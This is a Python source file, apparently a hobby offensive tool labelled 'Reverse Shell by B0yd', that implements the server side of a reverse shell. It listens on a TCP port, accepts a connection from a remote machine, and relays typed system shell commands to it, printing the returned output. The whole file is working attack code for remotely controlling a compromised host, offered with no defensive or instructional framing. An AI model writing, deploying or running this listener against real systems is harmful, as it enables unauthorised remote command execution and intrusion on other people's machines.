import socket

HOST = socket.gethostbyname(socket.gethostname()) 
PORT = 12345 
sock = None


def init_socket():
    try:
        global sock
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("[Socket created]")
        sock.bind((HOST, PORT))
        print("[Socket bound successfully]")
        # Listen to only one client
        sock.listen()
        print(f"Server listening on port {PORT}")
        accept_conn()
    except socket.error as err:
        print(f"[ERROR] Unable to initialize socket \nverbose: {err}")


def accept_conn():
    conn, address = sock.accept()
    print("Reverse connection will appear here")
    print(f"Connected to {address[0]}:{address[1]}")
    handle_client(conn, address)


def handle_client(conn, address):
    while True:
        conn.send(str(len('os.getcwd()')).encode('utf-8'))
        conn.send('os.getcwd()'.encode('utf-8'))
        print(conn.recv(2048).decode('utf-8'), end='')
        cmd = input()
        if cmd == '?':
            help_menu()
        elif cmd == 'exit' or cmd == 'quit':
            cmd_length = len(cmd)
            conn.send(str(cmd_length).encode('utf-8'))
            conn.send(cmd.encode('utf-8'))
            conn.close()
            break
        else:
            cmd_length = len(cmd)
            conn.send(str(cmd_length).encode('utf-8'))
            conn.send(cmd.encode('utf-8'))
            data = conn.recv(1024)
            if data != '':
                print(data.decode('utf-8'))


def help_menu():
    print("""Help Menu 
    \nAll kinds of system shell commands are supported based on the OS connected to
    \nto quit type 'quit' or 'exit'""")


print("Reverse Shell by B0yd\n")
print("?: help\n")
print("Server is starting...")
init_socket()
